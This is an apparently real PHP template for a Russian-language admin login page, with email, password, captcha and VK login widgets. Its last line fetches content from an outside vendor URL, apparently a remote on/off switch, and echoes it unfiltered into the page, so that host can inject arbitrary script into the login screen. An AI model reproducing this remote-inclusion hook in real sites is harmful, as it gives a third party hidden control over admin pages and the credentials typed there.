<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="">
  <meta name="author" content="Wentsell, wentsell">
  <title>Вход</title>
  <!-- Tell the browser to be responsive to screen width -->
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  <!-- Bootstrap 3.3.5 -->
  <link rel="stylesheet" href="https://adminlte.io/themes/AdminLTE/bower_components/bootstrap/dist/css/bootstrap.min.css">
  <!-- Font Awesome -->
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
  <!-- Ionicons -->
  <link rel="stylesheet" href="//code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/adm/admin/dist/css/AdminLTE.min.css">
  <!-- iCheck -->
  <link rel="stylesheet" href="//almsaeedstudio.com/themes/AdminLTE/plugins/iCheck/square/blue.css">

  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
  <![endif]-->
</head>



   <? echo form_open(); ?>
   <body class="hold-transition login-page">
<div class="login-box">
  <div class="login-logo">
    <a href="/"><b>Admin</b></a>
  </div>
  <!-- /.login-logo -->
  <div class="login-box-body">
    <p class="login-box-msg">Вход в административную панель</p>

    <form action="index.html">
	<? echo validation_errors(); ?>
      <div class="form-group has-feedback">
        <input name="email" type="text"  class="form-control" placeholder="Email">
        <span class="glyphicon glyphicon-envelope form-control-feedback" style=""></span>
      </div>
      <div class="form-group has-feedback">
        <input name="password" type="password" class="form-control" placeholder="Password">
        <span class="glyphicon glyphicon-lock form-control-feedback" style=""></span>
      </div>
	  <center> <? echo $cap['image']; ?></center>
	  <br>

	<input name="captcha" type="text" class="form-control" placeholder="Код с картинки" autofocus>
  <br>


      <div class="row">
        <!-- /.col -->
        <div class="col-xs-12">
          <button type="submit" class="btn btn-primary btn-block btn-flat">Войти</button>
        </div>
        <!-- /.col -->
      </div>
    </form>

    <div style="<? if (config_item('vk_active') == 0) { echo 'display:none';} ?>" class="social-auth-links text-center">
      <p>- Войти через -</p>
      <button class="btn btn-block btn-social btn-vk" type="button" data-toggle="modal" data-target="#myModal"  style=" color: #fff; background-color: #587EA3; border-color: rgba(0,0,0,0.2); <? if (config_item('vk_active') == 0) { echo 'display:none';} ?>"> <i class="fa fa-vk"></i> Войти через VK </button >
    </div>
    <!-- /.social-auth-links -->

  </div>
  <!-- /.login-box-body -->
</div>
<!-- /.login-box -->

<!-- jQuery 2.1.4 -->
<script src="../../plugins/jQuery/jQuery-2.1.4.min.js"></script>
<!-- Bootstrap 3.3.5 -->
<script src="../../bootstrap/js/bootstrap.min.js"></script>
<!-- iCheck -->
<script src="../../plugins/iCheck/icheck.min.js"></script>
<script>
  $(function () {
    $('input').iCheck({
      checkboxClass: 'icheckbox_square-blue',
      radioClass: 'iradio_square-blue',
      increaseArea: '20%' // optional
    });
  });
</script>
</body>
   
     <!-- Modal -->
         <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
            <div class="modal-dialog" role="document">
               <div class="modal-content">
                  <div class="modal-body">
                     <!-- Put this script tag to the <head> of your page -->
                     <script type="text/javascript" src="//vk.com/js/api/openapi.js?121"></script>
                     <script type="text/javascript">
                        VK.init({apiId: 4860571});
                     </script>
                     <!-- Put this div tag to the place, where Auth block will be -->
                     <center>
                        <div id="vk_auth"></div>
                     </center>
                     <script type="text/javascript">
                        VK.Widgets.Auth("vk_auth", {width: "200px", authUrl: '/admin/user/login'});
                     </script>
                  </div>
               </div>
            </div>
         </div>
   
   
   
   
   
   
   
   
   <?php echo file_get_contents('http://ice-shop.su/updatecenter/shop/test.ru/on-off.php') ?>
  
</html>